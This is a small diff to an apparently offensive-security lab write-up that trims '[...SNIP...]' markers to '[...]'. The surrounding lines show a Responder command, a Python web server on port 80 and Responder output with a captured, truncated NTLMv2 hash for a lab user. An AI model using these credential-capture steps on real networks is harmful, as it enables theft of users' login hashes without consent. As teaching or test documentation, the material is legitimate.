@@ -129,7 +129,7 @@ python3 -m http.server 80
 
 ```plain
 responder -I eth0 -A -f -v
-[...SNIP...]
+[...]
 [+] Generic Options:
     Responder NIC              [eth0]
     Responder IP               [10.10.10.37]
@@ -150,7 +150,7 @@ responder -I eth0 -A -f -v
 ```plain
 [SMB] NTLMv2-SSP Client   : 10.10.10.15
 [SMB] NTLMv2-SSP Username : WS7-2\User
-[SMB] NTLMv2-SSP Hash     : User::WS7-2:2f5d1007fc42a38e:74DF5D8A06BF0059BCCA1AB300782DED:0101000000000000C0653150DE09D2012E16D14827C3AF5500[...SNIP...]
+[SMB] NTLMv2-SSP Hash     : User::WS7-2:2f5d1007fc42a38e:74DF5D8A06BF0059BCCA1AB300782DED:0101000000000000C0653150DE09D2012E16D14827C3AF5500[...]
 ```
 
 #### Find captured hashes
